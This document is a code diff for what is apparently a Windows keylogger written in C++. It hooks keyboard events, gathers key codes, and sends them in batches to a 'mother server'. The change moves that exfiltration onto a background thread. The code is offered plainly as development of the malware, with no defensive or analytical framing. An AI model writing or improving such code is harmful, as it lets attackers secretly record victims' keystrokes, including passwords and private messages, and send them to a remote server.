@@ -9,7 +9,6 @@
 #include <Windows.h>
 #include <WinUser.h>
 #include <vector>
-#include <thread>
 #include "codes.h"
 #include "connections_pivoter.h"
 #include "security_checker.h"
@@ -18,15 +17,27 @@
 #define KEYS_LIMIT 200
 HHOOK keyboard_events_hook; 
 std::vector<std::string> virt_codes; 
+std::vector<std::string> thread_codes; 
 ConnectionsPivoter mother_server_pv = ConnectionsPivoter();
+
+DWORD WINAPI send_codes_thread_function(LPVOID keys) {
+	std::vector<std::string>* keys_ptr = static_cast<std::vector<std::string>*>(keys);
+	bool res = mother_server_pv.send_codes(*keys_ptr);
+
+	if (DEBUG && !res) {
+		std::cout << "Failed sending to the mother server!" << std::endl;
+		return 1; 
+	}
+
+	return 0; 
+}
 
 void stack_codes() {
 	if (virt_codes.size() < KEYS_LIMIT)
 		return; 
 	
-	bool res = mother_server_pv.send_codes(virt_codes); 
-	if (DEBUG && !res)
-		std::cout << "Failed sending message to the mother server" << std::endl; 
+	thread_codes = virt_codes; 
+	HANDLE thread = CreateThread(NULL, 0, send_codes_thread_function, &thread_codes, 0, NULL);
 
 	virt_codes.clear();
 }
